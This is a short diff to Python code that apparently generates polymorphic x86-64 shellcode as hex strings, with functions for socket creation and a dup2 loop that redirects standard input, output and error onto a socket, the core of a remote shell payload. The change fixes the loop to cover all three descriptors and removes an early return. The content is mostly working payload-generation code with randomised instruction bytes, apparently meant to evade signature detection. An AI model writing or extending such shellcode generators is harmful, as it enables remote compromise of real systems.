@@ -59,8 +59,6 @@ def create_socket():
     elif rand == 2:
         PAYLOAD += "48ffc6"
     PAYLOAD += call()
-    return PAYLOAD
-    
 
 
 #def socket_connect(ip, port):
@@ -71,7 +69,7 @@ def create_socket():
 def dup2x3():
     global PAYLOAD
     PAYLOAD += clean('rax')
-    for i in range(0,2):
+    for i in range(0,3):
         PAYLOAD += "b03f"
         PAYLOAD += "4c89d7"
         PAYLOAD += call()
